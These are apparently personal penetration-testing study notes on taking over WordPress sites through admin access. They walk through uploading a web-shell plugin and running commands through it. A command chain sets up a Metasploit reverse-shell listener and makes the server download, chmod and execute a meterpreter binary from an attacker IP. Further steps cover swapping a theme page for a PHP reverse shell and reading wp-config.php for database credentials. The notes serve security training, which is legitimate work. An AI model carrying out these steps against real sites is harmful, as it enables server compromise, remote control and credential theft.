## WordPress Lessons

Some things I learned dealing with WordPress pages

- Default admin landing is DOMAN/wp-admin
- Once logged into the domain console,  check out Tools->Site health->Info Tab to get Server and DB information
  - Check DB IP Address to see if it's on the same server
  - Check PHP version

### PHP Shells

#### Plugin Shell

Seclists contains malicious plugins to use with apps like WordPress

```bash
sudo apt install seclists
```

WordPress shell plugin is in `/usr/share/seclists/Web-Shells/WordPress/plugin-shell.php`

REMEMBER TO ZIP PLUGINS!  WordPress expects a zip file

Upload the file to WordPress and access it, normally at `http://SITE.COM/wp-content/plugins/SHELLNAME/SHELLNAME.php`

Test the shell with an id command to see if it returns output:

```bash
http://SITE.COM/wp-content/plugins/SHELLNAME/SHELLNAME.php?cmd=id
```

At this point, you probably want to upload an exploit and run it:

```bash
# Start the listener
sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 192.168.119.216; set LPORT 443; run"
# Have the server get the exploit from your hosted site
curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=wget%20http://192.168.119.216/met.elf
# make the exploit executable
curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=chmod%20%2Bx%20met.elf
# Run it
curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=./met.elf
```

#### Using Themes

You can modify a theme page and insert php code into it, then load that page on the site.

1. Modify themes through `Appearance->Editor`, then choose a good candidate like `Archives`
2. Delete all text on the page and paste a PHP reverse shell code (such as `/usr/share/webshells/php/php-reverse-shell.php` or PentestMonkey's)
3. Start a listener (like netcat or msf's multi-handler tcp listener)
4. Visit the modified page `http://10.11.1.234/wp-content/themes/twentytwelve/archive.php`

### Grab the Database Info!

The Database may be stored on another server.  If you can get CLI access, check out /var/www/html/wp-config.php to find the DB user and password.

